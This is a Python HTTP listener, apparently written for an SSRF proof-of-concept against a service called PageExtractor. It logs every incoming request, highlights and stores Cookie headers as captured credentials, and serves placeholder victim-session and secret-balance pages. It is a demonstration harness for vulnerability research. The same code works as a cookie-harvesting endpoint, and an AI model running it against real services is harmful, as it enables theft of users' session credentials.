#!/usr/bin/env python3
"""Pretty-printing HTTP listener for the PageExtractor SSRF PoC. Ctrl+C to stop."""
import http.server, socketserver, datetime, sys

PORT = 8999
RED, GRN, YEL, DIM, RST = "\033[91m", "\033[92m", "\033[93m", "\033[2m", "\033[0m"
HITS = []

class H(http.server.BaseHTTPRequestHandler):
    def _dump(self):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"\n{GRN}{'='*74}{RST}")
        print(f"{GRN}[{ts}] {self.command} {self.path} {self.request_version}{RST}")
        for k, v in self.headers.items():
            if k.lower() == "cookie":
                print(f"  {RED}{k}: {v}{RST}   <-- CREDENTIALS ATTACHED")
            elif k.lower() in ("user-agent", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest"):
                print(f"  {YEL}{k}: {v}{RST}")
            else:
                print(f"  {DIM}{k}: {v}{RST}")
        HITS.append({"path": self.path, "cookie": self.headers.get("Cookie")})
        print(f"{GRN}{'='*74}{RST}")

    def do_GET(self):
        self._dump()
        if self.path.startswith("/victim-visit"):
            body = b"<html><title>victim origin</title>logged in</html>"
            self.send_response(200)
            self.send_header("Set-Cookie", "sessionid=VICTIM_SESSION_abc123; Path=/")
            self.send_header("Content-Type", "text/html")
        else:
            body = b"<html><body>SECRET_ACCOUNT_BALANCE_99999</body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_HEAD = do_GET
    def log_message(self, *a): pass

if __name__ == "__main__":
    socketserver.TCPServer.allow_reuse_address = True
    print(f"listener on 0.0.0.0:{PORT} — every request printed, cookies in RED")
    try:
        socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    except KeyboardInterrupt:
        print(f"\n{len(HITS)} request(s) received")
        for h in HITS:
            print(f"  {h['path']}  cookie={h['cookie']}")
